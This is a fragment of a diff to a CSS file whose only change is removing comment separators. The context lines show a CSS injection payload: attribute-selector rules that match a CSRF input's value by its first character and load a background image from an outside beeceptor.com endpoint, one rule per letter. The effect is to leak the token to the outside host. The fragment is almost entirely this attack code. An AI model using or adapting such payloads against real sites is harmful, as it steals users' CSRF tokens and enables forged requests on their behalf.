@@ -102,7 +102,6 @@ input[name=csrf][value^=z] ~ * {
     background-image: url(https://testfdfd.free.beeceptor.com/z);
 }
 
-/* ********* */
 
 input[name=csrf][value^=A] ~ * {
     background-image: url(https://testfdfd.free.beeceptor.com/A);
@@ -207,8 +206,6 @@ input[name=csrf][value^=Y] ~ * {
 input[name=csrf][value^=Z] ~ * {
     background-image: url(https://testfdfd.free.beeceptor.com/Z);
 }
-
-/* ****** */
 
 
 input[name=csrf][value^=1] ~ * {
